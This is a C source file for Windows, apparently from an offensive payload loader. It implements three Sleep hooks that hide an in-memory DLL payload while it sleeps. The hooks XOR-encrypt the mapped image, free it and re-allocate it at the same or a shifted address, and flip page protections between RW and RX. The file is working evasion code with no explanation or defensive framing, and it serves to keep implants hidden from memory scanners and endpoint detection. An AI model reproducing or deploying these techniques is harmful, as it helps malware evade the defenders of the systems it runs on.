#include <stdio.h>
#include <windows.h>
#include "structs.h"
#include "utils.h"

LPVOID oldbase;
void (*func_ptr)(void);
PMEM_MODULE GlobalpMemModule = NULL;

// Function to check if a function should be hooked
BOOL check_hook(const char* functionName) {
    const char* hookFunctions[] = { "Sleep" };
    for (int i = 0; i < sizeof(hookFunctions) / sizeof(hookFunctions[0]); i++) {
        if (strcmp(functionName, hookFunctions[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}


BOOL SetRXonSection(LPVOID lpBase, DWORD size) {
    DWORD dwOldProtect;
    if (FALSE == VirtualProtect(lpBase, size, PAGE_EXECUTE_READ, &dwOldProtect)) {
        return FALSE;
    }
    return TRUE;
}

BOOL SetRWonSection(LPVOID lpBase, DWORD size) {
    DWORD dwOldProtect;
    if (FALSE == VirtualProtect(lpBase, size, PAGE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }
    return TRUE;
}

//--------------------------------------------------------------------------------------------------------------//
// Hook function for Sleep
void WINAPI SleepHookMemoryBouncing(DWORD dwMilliseconds) {
    printf("[+] Hooked Sleep for %u milliseconds\n", dwMilliseconds);

    printf("[+] copying %u (%#llx) bytes from address %p to buffer\n", DllPayload.mappedimagesize, (unsigned long long)DllPayload.mappedimagesize, DllPayload.startOfMappedPE);
    memcpy(DllPayload.tempPEdatabuffer, DllPayload.startOfMappedPE, DllPayload.mappedimagesize);
    
    printf("[+] XORing buffer at address %#llx for size %#llx\n", (unsigned long long)DllPayload.tempPEdatabuffer, (unsigned long long)DllPayload.mappedimagesize);
    XORWithKey(DllPayload.tempPEdatabuffer, DllPayload.mappedimagesize, Configs.SleepXorKey);
    
    // free the memory at address (LPVOID)(pImageNtHeader->OptionalHeader.ImageBase)
    printf("[+] Freeing memory at address: %#llx\n", (unsigned long long)DllPayload.startOfMappedPE);
    if (FALSE == VirtualFree(DllPayload.startOfMappedPE, 0, MEM_RELEASE)) {
        printf("[!] Error: Failed to free memory. Error code: %lu\n", GetLastError());
        return;
    }

    SleepEx(dwMilliseconds, FALSE);
    printf("[+] End Sleep\n");

    printf("[+] Allocating memory again on address: %#llx\n", (unsigned long long)DllPayload.startOfMappedPE);
    LPVOID lpBase = VirtualAlloc((LPVOID)DllPayload.startOfMappedPE, DllPayload.mappedimagesize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpBase == NULL) {
        printf("[!] Error: Failed to allocate section on address: %#llx Error code: %lu\n", (unsigned long long)DllPayload.startOfMappedPE, GetLastError());
        return;
    }

    if (DllPayload.tempPEdatabuffer == NULL) {
        printf("[+] Error: Destination pointer is NULL\n");
        return;
    }

    // xoring the temp pe buffer
    
    printf("[+] XORing buffer at address %#llx for size %#llx\n",(unsigned long long)DllPayload.tempPEdatabuffer, (unsigned long long)DllPayload.mappedimagesize);
    XORWithKey(DllPayload.tempPEdatabuffer, DllPayload.mappedimagesize, Configs.SleepXorKey);
    printf("[+] Copying buffer\n");
    memcpy(lpBase, DllPayload.tempPEdatabuffer, DllPayload.mappedimagesize);
    printf("[+] Copied %u (%#llx) bytes at address %p\n", DllPayload.mappedimagesize, (unsigned long long)DllPayload.mappedimagesize, lpBase);
    printf("[+] XORing buffer at address %#llx for size %#llx\n", (unsigned long long)DllPayload.tempPEdatabuffer, (unsigned long long)DllPayload.mappedimagesize);
    XORWithKey(DllPayload.tempPEdatabuffer, DllPayload.mappedimagesize, Configs.SleepXorKey);
    
    
    printf("[+] Copied %u (%#llx) bytes at address %p\n", DllPayload.mappedimagesize, (unsigned long long)DllPayload.mappedimagesize, lpBase);
    
    
}



void WINAPI SleepHookMemoryHopping(DWORD dwMilliseconds) {
    printf("[+] Hooked Sleep for %u milliseconds\n", dwMilliseconds);

    void* returnAddress = _ReturnAddress();

    printf("[+] Return Address: %p\n", returnAddress);


    printf("[+] copying %u (%#llx) bytes from address %#llx to buffer for later use\n", DllPayload.mappedimagesize, (unsigned long long)DllPayload.mappedimagesize, (unsigned long long)pMemModule->lpBase);

    if (DllPayload.tempPEdatabuffer != NULL) {
        free(DllPayload.tempPEdatabuffer);
        DllPayload.tempPEdatabuffer = NULL;
    }

    // Allocate new memory and copy data into it
    DllPayload.tempPEdatabuffer = malloc(DllPayload.mappedimagesize);
    if (DllPayload.tempPEdatabuffer == NULL) {
        // Handle error
        return;
    }

    memcpy(DllPayload.tempPEdatabuffer, pMemModule->lpBase, DllPayload.mappedimagesize);

    // free the memory at address (LPVOID)(pImageNtHeader->OptionalHeader.ImageBase)
    printf("[+] Freeing memory at address: %#llx\n", (unsigned long long)pMemModule->lpBase);
    if (FALSE == VirtualFree(pMemModule->lpBase, 0, MEM_RELEASE)) {
        printf("[!] Error: Failed to free memory. Error code: %lu\n", GetLastError());
        return;
    }

    SleepEx(dwMilliseconds, FALSE);
    printf("[+] End Sleep\n");


    oldbase = pMemModule->lpBase;
    LPVOID temp = (char*)pMemModule->lpBase + 0x100000;
    printf("[+] Allocating memory again on address: %#llx\n", (unsigned long long)temp);
    pMemModule->lpBase = VirtualAlloc(temp, DllPayload.mappedimagesize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pMemModule->lpBase == NULL) {
        printf("[!] Error: Failed to allocate section on address: %#llx Error code: %lu\n", (unsigned long long)DllPayload.startOfMappedPE, GetLastError());
        return;
    }

    LONGLONG ldeltahop = (PBYTE)returnAddress - (PBYTE)oldbase;  //this is the offset from the start of the PE to the return address we should jump to
    void* NewReturnAddress = (PBYTE)pMemModule->lpBase + ldeltahop;


    printf("[+] Copying %u (%#llx) bytes from buffer to address %#llx\n", DllPayload.mappedimagesize, (unsigned long long)DllPayload.mappedimagesize, (unsigned long long)pMemModule->lpBase);

    if (DllPayload.tempPEdatabuffer == NULL) {
        printf("[+] Error: Destination pointer is NULL\n");
        return;
    }

    
    memcpy(pMemModule->lpBase, DllPayload.tempPEdatabuffer, DllPayload.mappedimagesize);
    printf("[+] Copied %u (%#llx) bytes at address %#llx\n", DllPayload.mappedimagesize, (unsigned long long)DllPayload.mappedimagesize, (unsigned long long)pMemModule->lpBase);
    doRelocations(pMemModule);
    func_ptr = (void (*)(void))NewReturnAddress;
    printf("[+] Jump Address: %p\n", NewReturnAddress);
    func_ptr();


}

void WINAPI SleepHookRWRX(DWORD dwMilliseconds) {

	printf("[+] Hooked Sleep for %u milliseconds\n", dwMilliseconds);

	printf("[+] Setting RW permissions on address  %#llx for size %#llx\n", (unsigned long long)DllPayload.execRegionPtr,(unsigned long long)DllPayload.execRegionSize);
	if (FALSE == SetRWonSection(DllPayload.execRegionPtr,DllPayload.execRegionSize)) {
		DWORD dwError = GetLastError();
		printf("[!] Error: Failed to set RW on section. Error code: %lu\n", dwError);
		return;
	}

    
    printf("[+] XORing mapped PE memory on address %#llx for size %#llx\n", (unsigned long long)DllPayload.execRegionPtr, (unsigned long long)DllPayload.execRegionSize);
    XORWithKey(DllPayload.execRegionPtr, DllPayload.execRegionSize, Configs.SleepXorKey);
    
    SleepEx(dwMilliseconds, FALSE);
    printf("[+] End Sleep\n");

    
    printf("[+] XORing mapped PE memory on address %#llx for size %#llx\n", (unsigned long long)DllPayload.execRegionPtr, (unsigned long long)DllPayload.execRegionSize);
    XORWithKey(DllPayload.execRegionPtr, DllPayload.execRegionSize, Configs.SleepXorKey);
    
	
	printf("[+] Setting RX permissions on address  %#llx for size %#llx\n", (unsigned long long)DllPayload.execRegionPtr, (unsigned long long)DllPayload.execRegionSize);
	if (FALSE == SetRXonSection(DllPayload.execRegionPtr,DllPayload.execRegionSize)) {
		DWORD dwError = GetLastError();
		printf("[!] Error: Failed to set RX on section. Error code: %lu\n", dwError);
		return;
	}

}

